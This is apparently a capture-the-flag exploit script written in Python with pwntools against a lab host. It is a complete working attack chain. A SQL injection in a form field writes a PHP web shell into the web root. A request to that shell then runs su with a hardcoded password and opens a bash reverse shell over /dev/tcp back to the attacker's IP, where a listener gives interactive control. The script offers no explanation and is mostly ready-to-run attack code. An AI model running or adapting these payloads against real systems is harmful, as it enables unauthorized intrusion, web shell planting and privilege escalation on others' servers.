#!/usr/bin/python3 

from pwn import * 
import threading,sys,signal,requests

if len(sys.argv) != 3:
    print("\n\n[!] Usage : python3 " + sys.argv[0] + " <ip localhost>" + " filename\n")
    sys.exit(1)

def ctrl_c(key,sn):
    log.info("\n\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT,ctrl_c)

url = "http://10.10.11.116/"
ip_host = sys.argv[1]
file = sys.argv[2]

def sendData():

    data = {
        'username':'admin',
        'country': """Brazil' union select  "<?php system($_REQUEST['cmd']); ?>"  into outfile  "/var/www/html/%s"-- - """ % file

    }
    r = requests.post(url,data=data)

    log.info("File created")
    time.sleep(0.7)
    
def execute_command():
    cmd = {"cmd":"echo 'uhc-9qual-global-pw' | su -c 'bash -i >& /dev/tcp/%s/443 0>&1' 2>/dev/null" % ip_host}
    new_r = requests.post(url+ "%s" % file,data=cmd) 


if __name__ == '__main__':
    sendData()
    t = threading.Thread(target=execute_command,args=())
    t.start()
    
    try :
        console = listen(443,timeout=25).wait_for_connection()
        console.interactive()
    except:
        sys.exit(1)
